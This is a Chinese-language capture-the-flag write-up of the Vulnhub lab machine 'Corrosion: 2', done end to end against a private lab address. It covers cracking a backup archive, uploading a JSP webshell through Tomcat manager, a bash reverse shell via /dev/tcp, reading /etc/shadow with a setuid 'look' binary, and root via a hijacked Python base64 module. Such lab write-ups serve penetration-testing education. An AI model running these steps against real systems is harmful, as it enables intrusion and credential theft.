---
title: Vulnhub-Corrosion 2
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# Corrosion: 2

> https://www.vulnhub.com/entry/corrosion-2,745/
> 

提示：枚举才是神

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`6` ，`kali`是`10`
    
    ```php
    nmap -sP 192.168.56.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 21:50 CST
    Nmap scan report for 192.168.56.1
    Host is up (0.00048s latency).
    MAC Address: 0A:00:27:00:00:14 (Unknown)
    Nmap scan report for 192.168.56.2
    Host is up (0.00040s latency).
    MAC Address: 08:00:27:E5:3B:06 (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.6
    Host is up (0.00055s latency).
    MAC Address: 08:00:27:0A:3A:6B (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.10
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.56.6  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 21:51 CST
    Nmap scan report for 192.168.56.6
    Host is up (0.00032s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8080/tcp open  http-proxy
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22,8080 192.168.56.6  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 21:52 CST
    Nmap scan report for 192.168.56.6
    Host is up (0.00052s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
    8080/tcp open  http    Apache Tomcat 9.0.53
    MAC Address: 08:00:27:0A:3A:6B (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 5.X
    OS CPE: cpe:/o:linux:linux_kernel:5
    OS details: Linux 5.0 - 5.5
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22,8080 192.168.56.6  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 21:52 CST
    Nmap scan report for 192.168.56.6
    Host is up (0.00053s latency).
    
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    8080/tcp open  http-proxy
    | http-enum: 
    |   /backup.zip: Possible backup
    |   /examples/: Sample scripts
    |   /manager/html/upload: Apache Tomcat (401 )
    |   /manager/html: Apache Tomcat (401 )
    |_  /docs/: Potentially interesting folder
    MAC Address: 08:00:27:0A:3A:6B (Oracle VirtualBox virtual NIC)
    ```
    

## web渗透

### 80 端口

1. 访问主页是`Apache`默认页面
2. 扫描目录
    
    ```python
    gobuster dir -u http://192.168.56.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip
    ,txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.56.6
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              php,html,zip,txt
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.html                (Status: 403) [Size: 277]
    /index.html           (Status: 200) [Size: 10918]
    /.html                (Status: 403) [Size: 277]
    /server-status        (Status: 403) [Size: 277]
    Progress: 1102800 / 1102805 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    ```
    
    没扫描出什么，先放着
    

### 8080 端口

1. 访问时`Tomcat`的默认页面
    
    ![image.png](image%2089.png)
    
2. 二话不说，扫目录
    
    ```python
    gobuster dir -u http://192.168.56.6:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,txt                                                                 22:05:48 [45/161]
    ===============================================================                                                                                                                                                   
    Gobuster v3.6                                                                                                                                                                                                     
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                                     
    ===============================================================                                                                                                                                                   
    [+] Url:                     http://192.168.56.6:8080                                                                                                                                                             
    [+] Method:                  GET                                                                                                                                                                                  
    [+] Threads:                 10                                                                                                                                                                                   
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                                                                         
    [+] Negative Status codes:   404                                                                                                                                                                                  
    [+] User Agent:              gobuster/3.6                                                                                                                                                                         
    [+] Extensions:              php,html,zip,txt                                                                                                                                                                     
    [+] Timeout:                 10s                                                                                                                                                                                  
    ===============================================================                                                                                                                                                   
    Starting gobuster in directory enumeration mode                                                                                                                                                                   
    ===============================================================                                                                                                                                                   
    /docs                 (Status: 302) [Size: 0] [--> /docs/]                                                                                                                                                        
    /examples             (Status: 302) [Size: 0] [--> /examples/]                                                                                                                                                    
    /backup.zip           (Status: 200) [Size: 33723]                                                                                                                                                                 
    /readme.txt           (Status: 200) [Size: 153]                                                                                                                                                                   
    /manager              (Status: 302) [Size: 0] [--> /manager/] 
    /RELEASE-NOTES.txt    (Status: 200) [Size: 6898]
    Progress: 1102800 / 1102805 (100.00%)                                                                    
    ===============================================================                                                                                                                                                   
    Finished                                            
    =============================================================== 
    ```
    
    我已经把`404`状态码的过滤了
    
    - `/docs` 为`tomcat`的文档
    - `/examples/`是`tomcat`例子
    - `/backup.zip` 压缩包内容应该是备份的，解压需要密码
    - `readme.txt` 我以为是官方文档
        
        ```python
        Hey randy! It's your System Administrator. I left you a file on the server, I'm sure nobody will find it.
        Also remember to use that password I gave you.
        嘿，兰迪！我是你的系统管理员。我在服务器上给你留了一个文件，我相信没人能找到它。
        另外记得使用我给你的密码
        ```
        
    - `/manager` 需要提供账号密码
3. 暂时没什么线索，想尝试爆破出压缩包的密码
    - 使用`fcrackzip`
        
        ```python
        crackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
        
        PASSWORD FOUND!!!!: pw == @administrator_hi5
        ```
        
        解出密码 `@administrator_hi5`
        
    - 解压压缩包，输出破解出的密码
        
        ```python
        unzip backup.zip -d backup  
        Archive:  backup.zip
        [backup.zip] catalina.policy password: 
          inflating: backup/catalina.policy  
          inflating: backup/context.xml      
          inflating: backup/catalina.properties  
          inflating: backup/jaspic-providers.xml  
          inflating: backup/jaspic-providers.xsd  
          inflating: backup/logging.properties  
          inflating: backup/server.xml       
          inflating: backup/tomcat-users.xml  
          inflating: backup/tomcat-users.xsd  
          inflating: backup/web.xml
        ```
        
4. 解压后发现存在`tomcat-users.xml`以及`tomcat-users.xsd` ，配置tomcat用户及其角色，通常用于管理后台的访问权限
    
    ```python
    <role rolename="manager-gui"/>
    <user username="manager" password="melehifokivai" roles="manager-gui"/>
    
    <role rolename="admin-gui"/>
    <user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
    ```
    
    的到密码`melehifokivai` ，两个用户名`admin`和`manager` ，均尝试了`ssh`登录无果
    
5. 访问`/manager` 提交得到的账号密码，成功进入使用了`admin`和`melehifokivai`
    
    ![image.png](image%2090.png)
    

## 后台利用

1. 进入了`tomcat`的后台，涉及到`tomcat`后台的利用
    
    > https://blog.csdn.net/weixin_41924764/article/details/108196725
    > 
    
    > https://blog.csdn.net/qq_43615820/article/details/116357744 这里使用的是JSP的一句话木马
    > 
2. 复制恶意代码存为文件`2131.jsp` ，并使用`jar`制作`war`包
    
    ```python
    jar cvf 2131.war 2131.jsp
    ```
    
3. 然后上传`war`包
    
    ![image.png](image%2091.png)
    
4. 上传之后使用蚁🗡连接，测试成功
    
    ![image.png](image%2092.png)
    
5. 使用蚁🗡虚拟终端进行反弹`shell` ，同时`kali`开启监听
    
    ```python
    (tomcat:/bin/sh: ) $ bash -c 'bash -i >& /dev/tcp/192.168.56.10/1234 0>&1'
    ```
    
    ```python
    nc -lvp 1234                             
    listening on [any] 1234 ...
    192.168.56.6: inverse host lookup failed: Unknown host
    connect to [192.168.56.10] from (UNKNOWN) [192.168.56.6] 58882
    bash: cannot set terminal process group (1277): Inappropriate ioctl for device
    bash: no job control in this shell
    tomcat@corrosion:/var/spool/cron$ 
    ```
    
    获得shell！！！
    

## 提权 - tomcat用户

1. 查看权限
    
    ```python
    tomcat@corrosion:/var/spool/cron$ whoami
    tomcat
    tomcat@corrosion:/var/spool/cron$ id
    uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
    tomcat@corrosion:/var/spool/cron$ uname -a
    Linux corrosion 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
2. 寻找敏感目录
    - 家目录下存在`jaye`文件夹和`randy`文件夹，其中`jaye`没有访问权限，只能看`randy`的文件夹
        - `note.txt`
            
            ```python
            tomcat@corrosion:/home/randy$ cat note.txt 
            Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know
            that I changed your permissions for your home directory. You won't be able to remove or add files for now.
            
            I will change these permissions later on.
            
            See you next Monday randy!
            嘿 randy 我是你的系统管理员，希望你今天过得愉快！我只是想让你知道
            我更改了你的主目录的权限。你现在无法删除或添加文件。
            
            我稍后会更改这些权限。
            
            下周一见 randy！
            ```
            
        - `randombase64.py`
            
            ```python
            tomcat@corrosion:/home/randy$ cat randombase64.py 
            import base64
            message = input("Enter your string: ")
            message_bytes = message.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')
            print(base64_message)
            tomcat@corrosion:/home/randy$ 
            ```
            
        - `user.txt`
            
            ```python
            tomcat@corrosion:/home/randy$ cat user.txt
            ca73a018ae6908a7d0ea5d1c269ba4b6
            ```
            
3. 操作了一番还是没找到提权的地方，记得之前给了一串密码`melehifokivai` ，只尝试了randy的用户还有`jaye`账号的没尝试
    
    尝试在`jaye`使用`ssh`登录
    
    ```python
    ssh jaye@192.168.56.6
    jaye@192.168.56.6's password: 
    Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    19 updates can be applied immediately.
    To see these additional updates run: apt list --upgradable
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    $ 
    
    ```
    
    登陆成功
    

## 提权 - jaye用户

1. 寻找敏感文件
    - 在家目录下存在`Files`文件夹权限是`root`的，里边存在个可执行文件`look` ，是`root`权限的，并且我们拥有执行权限，这样我们就可以使用`look`命令来读取`shadow`文件的内容了
        
        ```python
        ---s--s--x  1 root root 14728 Sep 17  2021 look
        ```
        
2. 使用`look`命令读取`shadow`文件，读取`root`用户以及`randy`用户
    
    ```python
    ./look -f "root" /etc/shadow
    root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
    ./look -f "randy" /etc/shadow
    randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
    ```
    
    保存为`pass`文件放到`john`进行爆破，破解了五个多小时，仅破解了`randy`用户的密码
    
    ```python
    07051986randy (randy)
    ```
    
3. 使用密码登录`ssh`
    
    ```python
    ssh randy@192.168.56.6
    randy@192.168.56.6's password: 
    Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    19 updates can be applied immediately.
    To see these additional updates run: apt list --upgradable
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
    ```
    

## 提权 - randy用户

1. 查看权限
    
    ```python
    randy@corrosion:~$ sudo -l
    [sudo] password for randy: 
    Matching Defaults entries for randy on corrosion:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User randy may run the following commands on corrosion:
        (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
    ```
    
2. 查看`/home/randy/randombase64.py` 是否拥有修改权限
    
    ```python
    -rwxr-xr-x  1 root  root   210 Sep 20  2021 randombase64.py
    ```
    
    不能直接写入命令
    
3. 我们知道它使用了base64模块，我们直接去修改base64模块
    
    ```python
    randy@corrosion:~$ ls -al /usr/lib/python3.8/base64.py 
    -rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py
    ```
    
    刚好也拥有权限，修改文件
    
    ```python
    # nano /usr/lib/python3.8/base64.py
    import os
    ....
    def b64encode(s, altchars=None):
        os.system("/bin/bash")
    ```
    
    需要写在`b64encode` 函数里边是因为它文件（`randombase64.py`）里面调用了该函数
    
4. 执行文件`randombase64.py`
    
    ```python
    randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
    Enter your string: 1
    root@corrosion:/home/randy# 
    ```
    
    获得root用户！！！
    
5. 读取`flag`文件
    
    ```python
    root@corrosion:~# cat root.txt
    2fdbf8d4f894292361d6c72c8e833a4b
    ```
    

## 总结

学到tomcat后台提权方法，其实不止上传war方法，也可以直接使用MSF，不过使用方法是一样的，但是方便

以及提权，我们可以直接使用look来读取root的flag文件的，并且在laye用户也可以使用**`polkit-agent-helper-1`** 来提权的，不过拿到root权限不是更好吗